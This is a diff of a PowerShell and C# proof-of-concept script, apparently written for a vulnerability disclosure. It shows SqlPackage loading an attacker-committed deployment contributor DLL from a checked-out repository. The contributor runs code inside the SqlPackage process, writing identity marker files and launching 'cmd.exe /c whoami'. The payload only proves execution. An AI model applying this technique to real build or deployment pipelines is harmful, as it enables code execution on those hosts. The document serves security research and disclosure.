@@ -64,21 +64,23 @@ namespace MsrcLab
     public class MarkerContributor : DeploymentPlanModifier
     {
         public const string Id = "MsrcLab.MarkerContributor";
+        static readonly string MarkerA = @"$markerA";
+        static readonly string MarkerB = @"$markerB";
         protected override void OnExecute(DeploymentPlanContributorContext context)
         {
             try {
-                var who = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
-                var p = Process.GetCurrentProcess();
-                File.WriteAllText(@"$markerA",
+                string who = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
+                Process p = Process.GetCurrentProcess();
+                File.WriteAllText(MarkerA,
                     "IN-PROCESS CODE EXECUTION INSIDE SqlPackage" + Environment.NewLine +
                     "process=" + p.ProcessName + " pid=" + p.Id + Environment.NewLine +
                     "identity=" + who + Environment.NewLine +
                     "image=" + p.MainModule.FileName + Environment.NewLine);
-                var psi = new ProcessStartInfo("cmd.exe", "/c whoami > \"$markerB\"");
+                ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c whoami > \"" + MarkerB + "\"");
                 psi.UseShellExecute = false; psi.CreateNoWindow = true;
                 Process.Start(psi).WaitForExit(20000);
             } catch (Exception ex) {
-                File.WriteAllText(@"$markerA" + ".err", ex.ToString());
+                File.WriteAllText(MarkerA + ".err", ex.ToString());
             }
         }
     }
@@ -90,7 +92,6 @@ $csproj = @'
   <PropertyGroup>
     <TargetFramework>net8.0</TargetFramework>
     <AssemblyName>MsrcLab.Contrib</AssemblyName>
-    <EnableDynamicLoading>true</EnableDynamicLoading>
     <Nullable>disable</Nullable>
   </PropertyGroup>
   <ItemGroup>
@@ -108,7 +109,7 @@ $contribDll = Join-Path $contribDir 'MsrcLab.Contrib.dll'
 Write-Output ("  contributor dll : " + $contribDll + "  exists " + (Test-Path $contribDll))
 # the attacker commits it, so stage it where a checked-out repo file would sit
 if (Test-Path $contribDll) {
-    Copy-Item (Join-Path $contribDir '*.dll') $repoDir -Force
+    Copy-Item $contribDll $repoDir -Force
     Write-Output ("  staged into the checked-out tree : " + ((Get-ChildItem $repoDir -Filter *.dll).Count) + " dll files")
 }
 
@@ -148,7 +149,7 @@ foreach ($cand in @($repoDir, $contribDll)) {
     Reset-Markers
     Write-Output ("  --- contributor path form : " + $cand)
     $o = & $sqlPackage '/Action:Publish' "/SourceFile:$srcDac" "/TargetServerName:$target" '/TargetDatabaseName:Fabrikam0' "/p:AdditionalDeploymentContributorPaths=$cand" "/p:AdditionalDeploymentContributors=MsrcLab.MarkerContributor" 2>&1 | Out-String
-    ($o -split "`r?`n") | Where-Object { $_.Trim() } | Select-Object -First 5 | ForEach-Object { Write-Output ("    out> " + $_.Trim()) }
+    ($o -split "`r?`n") | Where-Object { $_.Trim() } | Select-Object -First 12 | ForEach-Object { Write-Output ("    out> " + $_.Trim()) }
     Show-Markers 'C0'
     if (Test-Path $markerA) { $goodForm = $cand; break }
 }
@@ -166,7 +167,7 @@ function RunLeg([string]$label, [string]$fileName, [string]$commitMsg) {
     $a = Get-SqlPackageCmdArgs -dacpacFile $dacpac -targetMethod 'server' -serverName $target -databaseName 'Fabrikam' -additionalArguments ''
     Write-Host ("  argument string     : " + $a)
     try { $out = ExecuteCommand -FileName $sqlPackage -Arguments $a } catch { $out = "$_" }
-    ($out -split "`r?`n") | Where-Object { $_.Trim() } | Select-Object -First 4 | ForEach-Object { Write-Host ("  out> " + $_.Trim()) }
+    ($out -split "`r?`n") | Where-Object { $_.Trim() } | Select-Object -First 10 | ForEach-Object { Write-Host ("  out> " + $_.Trim()) }
 }
 
 Write-Output ""
